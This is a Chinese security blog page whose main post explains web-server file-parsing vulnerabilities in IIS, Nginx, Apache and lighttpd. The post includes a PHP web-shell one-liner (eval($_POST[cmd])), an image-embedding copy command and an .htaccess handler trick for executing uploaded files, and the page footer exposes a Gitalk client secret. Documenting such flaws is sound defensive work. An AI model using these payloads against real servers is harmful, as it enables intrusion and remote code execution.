<p>Kali Linux提供工具lbd来获取网站的负载均衡信息。该工具可以根据DNS域名解析、HTTP服务的header和响应差异，来识别均衡方式。由于用户所使用的线路不同，获取的输出结果不同。大家可以把运行结果和其他人的做比较，以发现目标网站的更多服务器。</p>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="https://www.pa55w0rd.club/pa55w0rd-new.github.io/代理/" data-id="cjoo67ge5000ldxt64m717i9z" class="article-share-link" data-share="baidu" data-title="代理">分享到</a>
      

      
        <a href="https://www.pa55w0rd.club/pa55w0rd-new.github.io/代理/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>









  
    <article id="post-解析漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/pa55w0rd-new.github.io/解析漏洞/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-19T09:23:03.000Z" itemprop="datePublished">2018-10-19</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/pa55w0rd-new.github.io/categories/web安全/">web安全</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/pa55w0rd-new.github.io/解析漏洞/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>解析漏洞</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <ul>
<li>目录<br>{:toc}</li>
</ul>
<h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><ol>
<li><p>目录解析</p>
<p> 在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p>
<p> 例如创建目录 xx.asp，那么/xx.asp/xx.jpg将被当作asp文件来执行。假设攻击者可以控制上传文件夹路径，就可以不管你上传后你的图片改不改名都能拿shell了。</p>
<p> /xx.asp/xx.jpg</p>
</li>
<li><p>文件解析</p>
<p> 在IIS6.0下，分号后面的不被解析，也就是说xx.asp;.jpg会被服务器看成是xx.asp</p>
<p> xx.asp;.jpg</p>
<p> 另外IIS6.0 默认的可执行文件除了asp还包含这三种:</p>
<p> /shell.asa</p>
<p> /shell.cer</p>
<p> /shell.cdx</p>
</li>
</ol>
<h2 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞"></a>IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h2><p>在默认Fast-CGI开启状况下,上传一个名字为xx.jpg，内容为<br><code>&lt;?PHP fputs(fopen(‘shell.php’,’w’),&#39;&lt;?php eval($_POST[cmd])?&gt;’);?&gt;</code><br>的文件，然后访问xx.jpg/.php,在这个目录下就会生成一句话木马 shell.php</p>
<p>e.g. 将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p>
<p><code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p>
<ul>
<li><p>/b 即二进制[binary]模式</p>
</li>
<li><p>/a 即ascii模式 xx.jpg正常图片文件 </p>
</li>
</ul>
<h2 id="Nginx-lt-8-03-空字节代码执行漏洞"><a href="#Nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="Nginx &lt;8.03 空字节代码执行漏洞"></a>Nginx &lt;8.03 空字节代码执行漏洞</h2><p>影响版本:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p>
<p>Nginx在图片中嵌入PHP代码然后通过访问</p>
<p>xxx.jpg%00.php</p>
<p>来执行其中的代码</p>
<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.</p>
<p>比如 shell.php.a.rar “.a”和”.rar” 这两种后缀是apache不可识别解析,apache就会把shell.php.a.rar解析成php</p>
<h2 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h2><p>xx.jpg/xx.php</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，利用windows的这种特性，通过抓包在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</p>
<p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:</p>
<p><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></p>
<p>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件</p>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="https://www.pa55w0rd.club/pa55w0rd-new.github.io/解析漏洞/" data-id="cjoo67gee000udxt6bocyjnwu" class="article-share-link" data-share="baidu" data-title="解析漏洞">分享到</a>
      

      
        <a href="https://www.pa55w0rd.club/pa55w0rd-new.github.io/解析漏洞/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/pa55w0rd-new.github.io/page/3/">&laquo; Prev</a><a class="page-number" href="/pa55w0rd-new.github.io/">1</a><a class="page-number" href="/pa55w0rd-new.github.io/page/2/">2</a><a class="page-number" href="/pa55w0rd-new.github.io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/pa55w0rd-new.github.io/page/5/">5</a><a class="page-number" href="/pa55w0rd-new.github.io/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/pa55w0rd-new.github.io/page/9/">9</a><a class="extend next" rel="next" href="/pa55w0rd-new.github.io/page/5/">Next &raquo;</a>
    </nav>
  

</section>
      
      <aside id="sidebar">
  
    
  <div class="widget-wrap">

    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-file-text-o"></i>近期文章</h3>
    <div class="widget">
      <ul>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/pa55w0rd-new.github.io/jekyll迁移hexo/">jekyll迁移hexo</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/pa55w0rd-new.github.io/lynis/">Lynis</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/pa55w0rd-new.github.io/git_edit_remoteurl/">Git修改远程URL</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/pa55w0rd-new.github.io/linux_firefox_error/">Centos 7 运行firefox出错</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/pa55w0rd-new.github.io/mongodb_auth/">mongodb开启认证</a>
          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-tasks"></i>分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/pa55w0rd-new.github.io/categories/note/">note</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/pa55w0rd-new.github.io/categories/web安全/">web安全</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/pa55w0rd-new.github.io/categories/企业安全/">企业安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/pa55w0rd-new.github.io/categories/安全建设/">安全建设</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/pa55w0rd-new.github.io/categories/开发安全/">开发安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/pa55w0rd-new.github.io/categories/移动安全/">移动安全</a><span class="category-list-count">3</span></li></ul>
    </div>
  </div>


  <script>
  $(document).on("click", "ul.category-list li.category-list-item", function () {
    window.location.href = $(this).find('a').attr('href')
  })
  </script>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-cloud"></i>标签云</h3>
    <div class="widget tagcloud">
      <a href="/pa55w0rd-new.github.io/tags/note/" style="font-size: 10px;">note</a>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-archive"></i>归档</h3>
    <div class="widget">
      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/11/">十一月 2018</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/10/">十月 2018</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/09/">九月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/01/">一月 2018</a><span class="archive-list-count">1</span></li></ul> -->
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/11/">2018年11月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/10/">2018年10月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/09/">2018年09月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/pa55w0rd-new.github.io/archives/2018/01/">2018年01月</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>


<script>
$(document).on("click", "ul.archive-list li.archive-list-item", function () {
  window.location.href = $(this).find('a').attr('href')
})
</script>

  
    
  <style>
  *{ margin: 0; padding: 0;}
  .tooltips{ border-width: 1px; border-style: solid; position: absolute; display: none; border-radius: 3px; opacity: 0; filter:alpha( opacity = 0) ; z-index: 999;}
  .tooltips p.content{ padding: 5px; }
  .tooltips .triangle-front,.tooltips .triangle-back{ width: 0; height: 0; overflow: hidden; border-width: 8px; border-style: solid; position: absolute; border-color: transparent ; top: 100%; left: 50%; margin-left: -8px;}
  .tooltips .triangle-back{ margin-top: -1px;}

  .toolTipInfo{ border-color: #000; background-color: #EEEEEE;}
  .toolTipInfo .triangle-front{ border-top-color: #EEEEEE;}
  .toolTipInfo .triangle-back{ border-top-color: #EEEEEE;}


  .icoSize{font-size: 2em}
  </style>



  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-link"></i>链接</h3>
    <div class="widget" style="z-index: 1;">





      <!-- <ul> -->
        
          <!-- <li> -->
          

          

                  <a id="github-alt-icon-color" class="weight-icon-link" target="_blank" href="https://github.com/Pa55w0rd">
                      <span class="fa-stack fa-lg">
                          <i class="fa fa-circle fa-stack-2x"></i>
                          <i class="fa fa-github-alt fa-stack-1x fa-inverse"></i>
                      </span>
                  </a>
          

          

          

          

          

          

          


          

          


          <!-- </li> -->
        
          <!-- <li> -->
          

          

          

          

          

          

          

          


          
                  <a id="envelope-o-icon-color" class="weight-icon-link" target="_blank" href="mailto:pa55w0rd@aliyun.com" data-toggle="tooltip" data-placement="top" title="请多多交流！">
                  <span class="fa-stack fa-lg">
                          <i class="fa fa-circle fa-stack-2x"></i>
                          <i class="fa fa-envelope-o  fa-stack-1x fa-inverse"></i>
                      </span>
                  </a>
          

          


          <!-- </li> -->
        
      <!-- </ul> -->
    </div>
  </div>


  <script>
  $.fn.extend({
    hoverTips : function (){
      var self = $(this);
      var sw = self.get(0).switch;
      if( !sw ) {
        sw = true;
        var content = self.attr("tooltips");
        var htmlDom = $("<div class='tooltips'>")
            .addClass("toolTipInfo")
            .html("<p class='content'></p>"
                + "<p class='triangle-front'></p>"
                + "<p class='triangle-back'></p>");
        htmlDom.find("p.content").html( content );
      }
      self.on("mouseover",function(){
        $("body").append( htmlDom );
        var left = self.offset().left - htmlDom.outerWidth()/2 + self.outerWidth()/2;
        var top = self.offset().top - htmlDom.outerHeight() - parseInt(htmlDom.find(".triangle-front").css("border-width"));
        htmlDom.css({"left":left,"top":top - 10,"display":"block"});
        htmlDom.stop().animate({ "top" : top ,"opacity" : 1},300);
      });
      self.on("mouseout",function(){
        var top = parseInt(htmlDom.css("top"));
        htmlDom.stop().animate({ "top" : top - 10 ,"opacity" : 0},300,function(){
          htmlDom.remove();
          sw = false;
        });
      });
    },

  });

  $("#weixin-icon-color").hoverTips();
  $("#qq-icon-color").hoverTips();
  </script>



  
    
    <div class="widget-wrap">
  
      <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-group"></i>友链</h3>
      <div class="widget">
        <ul>
        
            <li onclick="javascript:document.getElementById('friend_links_item').click();">
              <a id="friend_links_item" href="https://firexun.github.io/"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>青衫磊落</a>
            </li>

        
        </ul>
      </div>
    </div>
  
  
  
</aside>

      
    </div>
    <footer id="footer">
  
  <div data-scroll-reveal="enter bottom" class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 Pa55w0rd<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
    </div>

    <div id="footer-info" class="inner">
        <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      <span id="busuanzi_container_site_pv"> 访问量
      <font color="#FF3030"><i class="fa fa-heartbeat"></i></font>
      <span id="busuanzi_value_site_pv"></span>次</span>

      <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1257415698'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1257415698%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>

    </div>
  </div>

</footer>

  </div>
  <nav id="mobile-nav">
  
    <a href="/pa55w0rd-new.github.io/" class="mobile-nav-link"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
  
    <a href="/pa55w0rd-new.github.io/archives" class="mobile-nav-link"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
  
    <a href="/pa55w0rd-new.github.io/about.html" class="mobile-nav-link"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
  
</nav>

  <!-- totop start -->
<div id="totop">
<a title="返回顶部"><img src="/pa55w0rd-new.github.io/img/betop.png"></a>
</div>

<!-- totop end -->



  <script>
    const gitalk = new Gitalk({
      clientID: "992fba235eb173826494",
      clientSecret: "d133f6427763be2cf4048e4d146a22043e745f22",
      repo: "",
      owner: "",
      admin: "",
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: "",      // Ensure uniqueness and length less than 50
      distractionFreeMode: false  // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
  </script>




<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/pa55w0rd-new.github.io/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
<script src="//cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>



  <link rel="stylesheet" href="/pa55w0rd-new.github.io/fancybox/jquery.fancybox.css">
  <script src="/pa55w0rd-new.github.io/fancybox/jquery.fancybox.pack.js"></script>



<! -- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
                processEscapes: true
                    
}
  
        });
</script>

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
                  
}
    
        });
</script>

<script type="text/x-mathjax-config">
MathJax.Hub.Queue(function() {
            var all = MathJax.Hub.getAllJax(), i;
            for(i=0; i < all.length; i += 1) {
                            all[i].SourceElement().parentNode.className += ' has-jax';
                                    
            }
                
        });
</script>

<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<script src="/pa55w0rd-new.github.io/js/script.js"></script>


</div>
</body>
</html>



<div class="site-search">
  <div class="algolia-popup popup">
    <div class="algolia-search">
      <div class="algolia-search-input-icon">
        <i class="fa fa-search"></i>
      </div>
      <div class="algolia-search-input" id="algolia-search-input"></div>
    </div>
    <div class="algolia-results">
      <div id="algolia-stats"></div>
      <div id="algolia-hits"></div>
      <div id="algolia-pagination" class="algolia-pagination"></div>
    </div>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
  </div>
</div>


<script>
$(document).ready(function(){
window.scrollReveal = new scrollReveal({ reset: true});
//
})
</script>
